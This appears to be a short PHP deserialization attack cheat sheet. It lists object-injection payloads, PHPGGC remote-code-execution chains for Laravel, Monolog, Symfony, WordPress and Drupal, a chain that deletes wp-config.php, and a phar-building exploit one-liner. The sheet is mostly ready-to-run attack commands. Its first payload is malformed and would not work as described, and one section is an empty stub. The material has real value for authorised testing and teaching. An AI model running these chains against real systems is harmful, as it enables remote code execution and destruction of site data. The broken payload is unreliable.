# PHP Deserialization

## 1. PHP Object Injection
```php
// Vulnerable code
$data = unserialize($_COOKIE['user']);
// Payload: O:4:"User":2:{s:4:"name";s:0:"";s:8:"__wakeup";s:6:"system";}
```

## 2. POP Chain Basics
```php
// Magic methods: __wakeup, __destruct, __toString, __call
// Chain: __destruct -> system()
class User {
    public $cmd;
    public function __destruct() {
        system($this->cmd);
    }
}
// Payload: O:4:"User":1:{s:3:"cmd";s:2:"id";}
```

## 3. Laravel RCE via PHPGGC
```bash
php phpggc Laravel/RCE1 system "id" -b
php phpggc Laravel/RCE5 system "id" -b
```

## 4. Monolog RCE
```bash
php phpggc Monolog/RCE1 system "id" -b
php phpggc Monolog/RCE2 system "id" -b
```

## 5. Symfony RCE
```bash
php phpggc Symfony/RCE1 system "id" -b
```

## 6. WordPress RCE
```bash
php phpggc WordPress/GDDelete /var/www/html/wp-config.php
php phpggc WordPress/RCE1 system "id"
```

## 7. Drupal RCE
```bash
php phpggc Drupal7/RCE1 system "id"
```

## 8. Phar Deserialization
```php
// Trigger via phar://
file_exists("phar://uploads/exploit.phar/test.txt");
file_get_contents("phar://uploads/exploit.phar/test.txt");
// Any file operation on phar:// triggers deserialization
```

## 9. Phar Creation
```bash
php -d 'phar.readonly=0' -r "
\$phar = new Phar('exploit.phar');
\$phar->startBuffering();
\$phar->addFromString('test.txt', 'test');
\$phar->setStub('<?php __HALT_COMPILER(); ?>');
\$phar->setMetadata('O:4:\"User\":1:{s:3:\"cmd\";s:2:\"id\";}');
\$phar->stopBuffering();
"
```

## 10. Type Juggling in Deserialization
```php
// If application uses == instead of ===
// Craft object with type confusion
```

## Tools
```bash
# PHPGGC
git clone https://github.com/ambionics/phpggc.git
php phpggc -l  # List gadget chains
# phpggc usage
php phpggc <chain> <command> [arguments]
```
